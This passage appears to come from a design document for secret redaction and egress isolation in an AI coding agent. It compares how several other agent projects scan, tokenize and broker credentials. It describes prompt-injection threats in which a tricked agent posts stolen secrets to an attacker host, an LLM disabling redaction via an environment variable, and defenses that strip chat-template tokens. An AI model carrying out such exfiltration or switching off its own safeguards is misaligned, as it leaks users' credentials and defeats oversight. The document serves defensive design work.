| **8b** | Hashed learned-secret memory: keyed-hash (HMAC) of any detected real secret, so it is scrubbed on every future appearance without storing plaintext; non-reversible token for logs/transcripts | session set + optional encrypted at-rest memory |
| **9** | ReDoS guard for every user/hook-supplied regex (allowlists, banned cmds, hook matchers) + ReDoS-safe scanning engine | `safe_regex` analyzer; gitleaks already RE2 |
| **10** | Prompt-injection hardening: wrap untrusted external content in random boundary markers, strip LLM chat-template tokens, fold homoglyphs | `external-content` module for web-fetch/browser/MCP inputs |
| **11** | Architectural egress isolation (opt-in): encrypted secret sentinels in-context + brokered host-scoped egress proxy that resolves them only at allowlisted HTTPS hops | `SecretStore` + egress proxy; net-policy allowlist mode |

Each phase is gated by its own test suite including adversarial fixtures
(`confinement_vectors_test.go` is the template — add a `secret_vectors_test.go`).

---

## Research: What Other Agents Do

Combed `other_project_research/` (openclaw, hermes-agent, oh-my-pi, unch,
opencode). None import gitleaks/trufflehog/detect-secrets. Two raise the bar in
different dimensions: **hermes-agent** has the best *detection* engine, and
**openclaw** ships the deepest *credential/egress* machinery (encrypted
sentinels, a brokered egress proxy, a known-value registry) — see its deep-dive
below. **Read the openclaw caveat first, though**: its *documented* threat
model is far narrower than its code suggests, and several things it builds are
opt-in, not default.

| Agent | Lang | In-pipeline scan? | Technique | Placement | Action |
|---|---|---|---|---|---|
| hermes-agent | Python | **Yes (full)** | ~40 vendor-prefix regexes + ENV/JSON/auth-header/PEM/DB-connstring/JWT/URL + phone | tool results → LLM; + subprocess env blocklist | Redacts in place |
| oh-my-pi | Rust/TS | Partial | keyword denylist on env keys; recursive JSON key-drop (AWS/curl/psql) | shell/CLI output → LLM (minimizer) | Masks / drops field |
| opencode | TS | Export-only + external plugin | structural `[redacted:<kind>:<id>]` on export; VibeGuard plugin (external, pre-LLM, restore locally) | `opencode export --sanitize`; NOT in live path | Redacts (export) |
| unch | Go | **None** | credential storage only | — | — |
| **openclaw** | TS | **Yes (deepest)** | encrypted secret sentinels + brokered egress proxy + known-value registry + ReDoS-safe regex + prompt-injection wrapping | at secret mint, at network egress, and in logs | Substitutes/refuses (blocks) |

### Worth stealing

- **hermes → shape of a good scanner**: substring pre-gating (-68% fast path),
  non-reusable sentinels (the write-back-corruption bug above),
  `code_file`/`file_read` FP modes, **env snapshot at import** (an LLM can't
  `export REDACT=false` mid-session) + a `force` path overriding the user
  opt-out at hard boundaries, plus dedicated scrubbers for URL query params
  (`?token=`), URL userinfo (`user:pass@`), DB connstrings, form bodies, and
  `Authorization:` headers.
- **hermes → subprocess env sanitization**: strips a provider-derived blocklist
  + `_ALWAYS_STRIP_KEYS` + a dynamic `*_API_KEY`/`*_SECRET`/`*_TOKEN` predicate
  before any child process runs. Phosphor already allowlists env (stricter than
  hermes's blocklist) — confirm the default excludes every provider token and
  add the dynamic-suffix predicate as defense-in-depth.
- **oh-my-pi → structured JSON key-drop**: for JSON-returning tools, drop whole
  fields by exact key (`SecretString`, `SessionToken`, `Credentials`,
  `PrivateKey`, …) recursively — cheaper and lower-FP than value-scanning.
  Good complement for MCP/CLI results.
- **opencode → reversible id tokenization + VibeGuard model**: pre-LLM
  placeholder + *local* restore is exactly the "keep the secret off the wire,
  let the agent still work" pattern; validates our hook design.

### openclaw — the architectural tier detection alone can't reach

openclaw (TS, the most security-mature of the five) does not rely on scanning
at all for its strongest guarantees — it removes plaintext from the agent's
reach entirely. Four mechanisms worth studying ("src/secrets/"):

1. **Encrypted secret sentinels** ("sentinel.ts"). When a credential is
   injected into the agent's world it is replaced by an AES-256-GCM sealed
   token "oc-sent-v2.<b64url>.end". The model, the transcript, and every tool
   result ever contain only the sentinel — never the bytes. A keyed (HMAC)
   nonce makes tokens stable-by-(value,label) *without* keeping a plaintext
   reverse-map; the GCM auth tag makes tampering detectable; resolution only
   happens inside the broker. This is the hardened end of hermes's
   non-reusable-sentinel idea: useless to an attacker, still reversible in the
   one trusted place.
2. **Brokered egress proxy** ("egress-proxy/", "packages/net-policy/"). Agent
   network calls route through a local forward proxy that enforces host
   allowlisting, HTTPS-only, proxy-auth, and substitutes sentinel→plaintext
   **only at the allowlisted final hop**, streaming over a byte "Transform"
   with a carry-buffer (handles a sentinel split across chunks) and a
   max-length bound (DoS). Unresolvable sentinel ⇒ the request is **refused**
   ("unresolved-sentinel"), not forwarded as an opaque token. Net effect: even
   a fully prompt-injected agent that tries "POST stolen" to an attacker host
   cannot move a real secret — it only holds sentinels, and only the proxy
   resolves them, only to allowlisted HTTPS destinations. **Caveat:** openclaw
   brokers egress *it* issues (provider/web tools), not arbitrary bash
   subprocesses; Phosphor's bash binary-ban + confinement is the subprocess
   analogue. Combining both is the goal.
3. **Known-value redaction registry** ("logging/secret-redaction-registry.ts").
   Every secret the app itself loads is registered; any text through the
   output/log path has those *exact* strings scrubbed via a bounded (512)
   first-char-probed, longest-prefix-bucketed matcher. It registers the raw,
   "encodeURIComponent", and JSON-escaped forms so transformed copies are also
   caught. Complements gitleaks: "scrub the secrets we already know we own"
   is cheap, precise, and catches formats no regex knows.
4. **Prompt-injection + ReDoS hardening** ("security/external-content.ts",
   "security/safe-regex.ts"). Untrusted external content (email/webhook/browser/
   web) is wrapped in **random per-call boundary markers**, LLM chat-template
   special tokens ("<|im_start|>", "[INST]", "<s>", "<|call|>"…) are stripped,
   and fullwidth/zero-width/homoglyph variants are folded so spoofed markers
   are caught — directly addressing "tricked into sending creds out." Separately,
   "safe-regex.ts" statically rejects nested-repetition user regexes (ReDoS),
   with a bounded test window + LRU — needed because we'd run regex over
   *attacker-influenced* bytes and user config.

It also runs a **OpenGrep/SAST rulepack** in CI ("security/opengrep/", incl. a
GHSA rule for skill env leakage) as a "regression firewall", and ships
**secret-inventory scanners** ("runtime-secret-scan.ts", "storage-scan.ts",
"target-registry*") that recursively find SecretRef/credential fields in config
trees (cycle-safe via "WeakSet").

**Caveat — the posture is narrower than the code (the "disclaimer" read is
correct).** "SECURITY.md" declares OpenClaw a *one-trusted-operator personal
assistant*, not a multi-tenant boundary, and explicitly puts a lot **out of
scope**: prompt-injection-only attacks ("out of scope" unless paired with an
auth/policy/sandbox bypass), a malicious plugin an operator chose to install,
attacker-controlled env vars ("trusted host control"), and adversarial users
sharing a gateway. "agents.defaults.sandbox.mode" **defaults to "off"** and
exec is **host-first by default** — isolation is opt-in and the docs lean on
"one user per host/VPS." The egress proxy is **opt-in too** ("registerRun"
throws unless a proxy was started). And it treats **operator-supplied ReDoS
regex as not-a-vulnerability** ("logging.redactPatterns" catastrophic regex is
"hardening," not a boundary bypass) — yet *still ships* "safe-regex.ts", so the
mitigation exists even if they won't bounty it.

The takeaway that *survives* their disclaimer: all that machinery defends one
threat that "just run it in a container" does **not** — your *own* loaded
secret reaching an **external** party (the model provider's wire, or an
attacker host via prompt-injection'd "POST"). A container isolates the host;
it does not stop the agent from exfiltrating a key it already holds to the
internet. The sentinel+proxy+registry design does. So for our goal it is a
real, load-bearing complement to the container story, not a substitute for it —
but I over-weighted it as broad "security maturity" last pass; it is deep on
*credential egress* specifically, inside a deliberately narrow threat model.

### What they do NOT do (our openings)

- Nobody scans the **provider request body** as a *pattern* last resort
  (hermes/oh-my-pi scan tool results only; opencode scans only on export;
  openclaw does not pattern-scan the wire — it removes plaintext upstream via
  the sentinel/proxy) → our point-6 outbound mask is still a cheap, orthogonal
  backstop worth having for secrets that entered via paste/tool-output rather
  than via a brokered provider call.
- Nobody runs **entropy for unknown formats** inline (hermes is pure regex +
  known prefixes) → our Stage-2 entropy + Stage-3 ML hook fill that gap.
- Nobody redacts **secrets pasted into user prompts** → only the outbound path
  can catch those.

Takeaway: **regex (gitleaks + hermes"s discipline) is necessary but not
sufficient.** Detection catches the *accidental* leak and the *unknown-format*
secret. openclaw shows that for the *malicious-exfiltration* threat the user
cares most about, the right answer is architectural: tokenization + a brokered,
host-scoped egress path means a tricked agent can"t move a real secret even if
it wants to. We should pursue both tiers — detection (default, invisible) and,
for the highest-risk egress, structural isolation (sentinels + proxy) as an
opt-in mode. We adopt gitleaks for the ruleset, hermes for the scanning
discipline, and openclaw for the isolation architecture.

---

## Decision Log

- **Not** embedding the LFM 350M encoder in-process: 354M params, ONNX runtime,
  new cross-platform native deps against `CGO_ENABLED=0` — too heavy for a
  gatekeeper that must stay invisible. Sits in a hook instead.
- **Not** using trufflehog's Go API: AGPL license + explicitly-unstable API +
  live-network verifiers (you don't want an agent's bash output scan making
  real AWS/GCP API calls).
- **Using** gitleaks `detect` lib despite feature-freeze because rulesets are
  frozen, not broken; 29k stars, MIT, and the same author ships betterleaks if
  we need forward movement.
- **Keeping detection invisible** (redact-in-place, fingerprint in session, no
  prompts) per the "first-class citizen, zero-friction" principle. Users see
  "<redacted:aws-access-key>" and move on.
- **Adopting hermes's operating discipline**: substring pre-gating, non-reusable
  sentinels for writable content, "code_file"/"file_read" FP modes, config
  snapshot + "force" path for the provider boundary, reversible-by-id
  tokenization for the outbound path.
- **Adding a structured-JSON key-drop** layer (from oh-my-pi) for MCP/CLI
  tool results that return JSON, alongside value scanning.
- **Pursuing an architectural tier from openclaw**: a known-value redaction
  registry (cheap to run, ship soon) and, for high-risk egress, encrypted secret
  sentinels + a brokered host-scoped proxy so a compromised agent cannot move
  a real secret. The brokered proxy is opt-in/heavier; the registry and the
  ReDoS guard and prompt-injection wrapping are cheap enough to default on.
  Note: openclaw's *own* default posture is the narrow one — sandbox `off`,
  exec host-first, prompt-injection/post-install-plugin/env-control out of
  scope, egress proxy opt-in. We copy the *credential/egress* machinery, not
  their trust model or their default-off stance.
- **ReDoS is a real threat for us** because we scan attacker-influenced bytes
  and run user/hook regexes — gitleaks is RE2-safe by construction, but our
  own allowlist/hook matcher inputs need a `safe_regex` validator (openclaw).
